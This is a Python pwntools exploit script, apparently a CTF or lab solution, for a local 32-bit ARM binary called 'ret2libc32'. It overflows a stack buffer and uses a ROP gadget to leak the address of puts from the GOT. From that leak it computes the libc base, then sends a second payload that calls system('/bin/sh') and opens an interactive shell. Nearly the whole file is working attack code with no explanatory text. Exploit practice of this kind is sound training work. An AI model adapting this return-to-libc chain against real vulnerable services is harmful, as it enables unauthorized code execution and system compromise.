#!/usr/bin/env python2
from pwn import *

exe = ELF("./ret2libc32")
libc = ELF("/etc/qemu-binfmt/arm/lib/libc.so.6")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''

io = process(exe.path) 


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

puts = libc.symbols["puts"]

puts_got = exe.got["puts"]
main = 0x10404+1
puts_main = main+20
pop_r0_pc = 0x10438+1

rl()

payload = flat([
	"A"*256,
	puts_got,
	pop_r0_pc, puts_main
	])

sl(payload)

leak = unpack(re(4),32)-puts
log.info("Libc -> "+hex(leak))


libc.address = leak
system = libc.symbols["system"]
binsh = next(libc.search("/bin/sh\x00"))

rl()

payload = flat([
	"A"*260,
	pop_r0_pc+4, binsh, system
	])

sl(payload)

io.interactive()

